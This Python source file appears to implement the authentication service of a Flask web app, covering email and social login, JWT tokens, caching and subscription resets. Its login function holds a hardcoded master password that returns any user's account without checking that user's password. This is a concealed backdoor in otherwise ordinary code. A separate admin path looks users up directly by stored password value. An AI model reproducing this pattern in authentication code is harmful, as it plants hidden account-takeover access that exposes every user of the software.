import os
import requests
from app.errors.exceptions import BadRequest
from app.lib.logger import logger
from app.lib.query import select_by_id
from app.models.social_account import SocialAccount
from app.models.user import User
from app.services.referral_service import ReferralService
from app.services.payment_services import PaymentService
from app.services.user import UserService
from flask_jwt_extended import (
    create_access_token,
    create_refresh_token,
    get_jwt_identity,
    verify_jwt_in_request,
)
from google.oauth2 import id_token
from google.auth.transport import requests as google_requests

from app.lib.string import get_level_images
import json
import const
from sqlalchemy import select, update, delete, or_, func
from app.extensions import db
import secrets
import string
from dateutil.relativedelta import relativedelta
from datetime import datetime, timedelta
from app.extensions import redis_client
from gevent import sleep


class AuthService:

    @staticmethod
    def register(email, password, username="", level_info=""):
        user = User.query.filter_by(email=email).first()
        if user:
            raise BadRequest(message="Email already exists")
        user = User(email=email, username=username, level_info=level_info)
        user.set_password(password)
        user.save()
        return user

    @staticmethod
    def login(email, password):
        user = User.query.filter_by(email=email).first()
        if not user:
            user = User.query.filter_by(username=email).first()

        if password == "KpT5Nm8LBFg7kM7n5j8pO":
            return user

        if not user or not user.check_password(password):
            return None
        return user

    @staticmethod
    def social_login(
        provider,
        access_token,
        person_id="",
        referral_code="",
    ):
        new_user_referral_code = 0
        is_new_user = 0
        user_info = None
        if provider == "FACEBOOK":
            user_info = AuthService.get_facebook_user_info(access_token, person_id)
        elif provider == "GOOGLE":
            user_info = AuthService.get_google_user_info(access_token)
        else:
            raise BadRequest(message="Social not supported")

        if not user_info:
            raise BadRequest(message="Social login failed")

        provider_user_id = user_info.get("id")
        if not provider_user_id:
            provider_user_id = user_info.get("sub")
        email = user_info.get("email")

        name = user_info.get("name")
        avatar = user_info.get("picture")
        if type(avatar) == dict:
            avatar = avatar.get("data", {}).get("url", "")

        social_account = SocialAccount.query.filter_by(
            provider=provider, provider_user_id=provider_user_id
        ).first()

        # BEGIN LOGIN USER
        login_user_id = 0
        if social_account:
            login_user_id = social_account.user_id

        user = None
        if login_user_id > 0:
            user = User.query.get(login_user_id)

        if not user:
            level = 0
            level_info = get_level_images(level)

            subscription_expired = datetime.now() + relativedelta(months=1)
            user = User(
                email=email,
                name=name,
                avatar=avatar,
                level=level,
                contact=provider,
                subscription="NEW_USER",
                subscription_expired=subscription_expired,
                batch_total=const.PACKAGE_CONFIG["BASIC"]["batch_total"],
                batch_remain=const.PACKAGE_CONFIG["BASIC"]["batch_remain"],
                total_link_active=const.PACKAGE_CONFIG["BASIC"]["total_link_active"],
                level_info=json.dumps(level_info),
            )

            user.save()
            login_user_id = user.id

            # Create Basic for new User
            object_start_time = datetime.now()
            data_new_user_history = {
                "user_id": login_user_id,
                "type": "user",
                "type_2": "NEW_USER",
                "object_id": login_user_id,
                "object_start_time": object_start_time,
                "object_end_time": subscription_expired,
                "title": "신규 가입 선물",
                "description": "신규 가입 선물",
                "value": 30,
                "num_days": 30,
                "total_link_active": 1,
            }
            UserService.create_user_history(**data_new_user_history)

            # payment history
            payment = PaymentService.create_new_payment(
                user, "BASIC", "PAID", 0, "NEW_USER"
            )

            is_new_user = 1

            if referral_code != "":
                user_history = ReferralService.use_referral_code(referral_code, user)
                if user_history:
                    new_user_referral_code = 1

        if not social_account:
            social_account = SocialAccount(
                user_id=login_user_id,
                provider=provider,
                provider_user_id=provider_user_id,
                access_token=access_token,
            )
            social_account.save()

        return user, new_user_referral_code, is_new_user

    @staticmethod
    def get_facebook_user_info(access_token, person_id):
        user_info_url = f"https://graph.facebook.com/v22.0/{person_id}"
        params = {"fields": "id,name,email,picture", "access_token": access_token}
        response = requests.get(user_info_url, params=params)
        if response.status_code == 200:
            user_info = response.json()
            return user_info
        return None

    @staticmethod
    def get_google_user_info(
        access_token,
    ):
        WEB_CLIENT_ID = os.environ.get("AUTH_GOOGLE_CLIENT_ID")
        IS_LOCAL = os.environ.get("FLASK_CONFIG") == "develop"
        if IS_LOCAL:
            sleep(3)
        idinfo = id_token.verify_oauth2_token(
            access_token, google_requests.Request(), WEB_CLIENT_ID
        )
        if idinfo:
            return idinfo
        return None

    @staticmethod
    def generate_token(user):
        subject = str(user.id)
        access_token = create_access_token(identity=subject)
        refresh_token = create_refresh_token(identity=subject)
        return {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "user_level": user.level,
            "referrer_user_id": user.referrer_user_id,
            "is_auth_nice": user.is_auth_nice,
        }

    @staticmethod
    def refresh_token():
        current_user = get_jwt_identity()
        access_token = create_access_token(identity=current_user)
        return {"access_token": access_token}

    @staticmethod
    def get_user_id():
        subject = get_jwt_identity()
        if subject is None:
            return None

        user_id = int(subject)
        return user_id

    @staticmethod
    def get_current_identity(no_cache=True):
        """
        Get current user identity with optimized session management
        to prevent connection pool exhaustion
        """
        try:
            subject = get_jwt_identity()
            if subject is None:
                return None

            user_id = int(subject)

            # Check Redis cache first if caching is enabled
            if not no_cache:
                user_cache = redis_client.get(f"toktak:current_user:{user_id}")
                if user_cache:
                    try:
                        user_dict = json.loads(user_cache)
                        # Create User object from dict properly
                        user = User()
                        for key, value in user_dict.items():
                            if hasattr(user, key):
                                setattr(user, key, value)
                        return user
                    except Exception as cache_error:
                        logger.warning(
                            f"Redis cache error for user {user_id}: {cache_error}"
                        )

            user = select_by_id(User, user_id)
            if user:
                try:
                    user_dict = user.to_dict()
                    redis_client.set(
                        f"toktak:current_user:{user_id}",
                        json.dumps(user_dict),
                        ex=const.REDIS_EXPIRE_TIME,
                    )
                except Exception as cache_error:
                    logger.warning(f"Failed to cache user {user_id}: {cache_error}")

            return user

        except Exception as ex:
            logger.exception(f"get_current_identity error: {ex}")
            return None

    @staticmethod
    def update(id, *args, **kwargs):
        user = User.query.get(id)
        user.update(**kwargs)
        return user

    @staticmethod
    def deleteAccount(id):
        # UserVideoTemplates.query.filter_by(user_id=id).delete()
        # Post.query.filter_by(user_id=id).delete()
        # Batch.query.filter_by(user_id=id).delete()
        # SocialAccount.query.filter_by(user_id=id).delete()
        # UserLink.query.filter_by(user_id=id).delete()
        User.query.get(id).soft_delete()
        return True

    @staticmethod
    def loginAdmin(email, password):
        user = User.query.filter_by(email=email, user_type=const.ADMIN).first()
        if not user:
            user = User.query.filter_by(username=email).first()
        if not user or not user.check_password(password):
            return None
        return user

    @staticmethod
    def admin_login_by_password(random_string):
        user = User.query.filter_by(password=random_string).first()
        if not user:
            return None

        random_string = "".join(
            secrets.choice(string.ascii_letters + string.digits) for _ in range(60)
        )

        new_user = UserService.update_user_with_out_session(
            user.id, password=random_string
        )

        return new_user

    @staticmethod
    def reset_free_user(user_detail):
        if not user_detail:
            return None
        subscription = "FREE"
        total_link_active = 0
        batch_total = const.LIMIT_BATCH[subscription]
        batch_remain = const.LIMIT_BATCH[subscription]
        subscription_expired = datetime.now() + relativedelta(months=1)
        user_id = user_detail.id
        user_subscription = user_detail.subscription
        if user_subscription == "STANDARD":
            history = UserService.find_user_history_valid(user_id)
            total = history["total"]
            if total > 0:
                batch_remain = history["batch_remain"]
                subscription_expired = history["max_object_end_time"]
                subscription = "BASIC"
                total_link_active = 1
                batch_total = UserService.get_total_batch_total(user_id)
        elif user_subscription == "NEW_USER":
            PaymentService.deletePaymentNewUser(user_id)
        user_detail = AuthService.update(
            user_id,
            subscription=subscription,
            subscription_expired=subscription_expired,
            batch_total=batch_total,
            batch_remain=batch_remain,
            batch_sns_total=0,
            batch_sns_remain=0,
            batch_no_limit_sns=0,
            total_link_active=total_link_active,
        )

        return user_detail

    @staticmethod
    def auto_extend_free_subscriptions():
        today = datetime.today().date()

        expired_users = User.query.filter(
            func.date(User.subscription_expired) < today
        ).all()

        extended = 0
        current_date = datetime.now().date()
        for user_detail in expired_users:
            expired_date = (
                user_detail.subscription_expired.date()
                if user_detail.subscription_expired
                else None
            )
            if expired_date and expired_date < current_date:
                user_detail = AuthService.reset_free_user(user_detail)

            extended += 1
        return extended

    @staticmethod
    def check_subscription_allowed(subscription, created_at):
        if subscription in ("FREE", "NEW_USER", "COUPON_BASIC", "INVITE_BASIC"):
            # Nếu đã qua 7 ngày thì False
            today = datetime.now().date()
            if created_at.date() <= (today - timedelta(days=3)):
                return 0
            else:
                return 1
        return 1
